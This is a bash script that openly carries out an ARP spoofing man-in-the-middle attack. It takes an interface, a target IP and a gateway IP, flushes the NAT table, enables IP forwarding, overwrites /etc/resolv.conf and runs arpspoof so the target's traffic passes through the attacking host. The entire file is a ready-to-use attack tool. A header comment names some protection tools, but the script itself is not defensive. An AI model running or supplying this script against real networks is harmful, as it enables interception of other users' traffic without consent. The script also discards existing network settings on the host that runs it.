#!/bin/bash
#
# ARP Spoofing attack
# OBS: Protection tools: ARPWatch, ARPON and XAr.
#
# Daniel Tomm           <tomm.daniel@gmail.com>
# Gabriel Richter       <gabrielrih@gmail.com>
# Creation Date:        2015-09-02
# Last Modification:    2017-03-18
#

# USAGE
use="USAGE: $0 [interface] [IP target] [IP gateway] [IP network]
	
	Parameters:
	[interface]     network interface. Eg. wlan0
	[IP target]     target IP
	[IP gateway]    gateway IP
	[IP network]    network IP / mask

	Example:
	$0 eth0 192.168.0.100 192.168.0.1 192.168.0.0/24"


# Check parameters
if [ $# != 4 ]
then
	echo "$use";
	exit 1;
fi

# Variables
interface=$1
iptarget=$2
ipgateway=$3
ipnetwork=$4

# Clear NAT table 
iptables -t nat -F
iptables -t nat -A POSTROUTING -o $interface -s $ipnetwork -j MASQUERADE

# It's important to the host to forward traffic to the Internet
echo 1 > /proc/sys/net/ipv4/ip_forward

# ADD DNS
echo "nameserver 8.8.8.8" > /etc/resolv.conf
echo "nameserver 8.8.4.4" >> /etc/resolv.conf

# Run ARP Spoofing
xterm -e "arpspoof -i $interface -t $iptarget $ipgateway" &

exit 0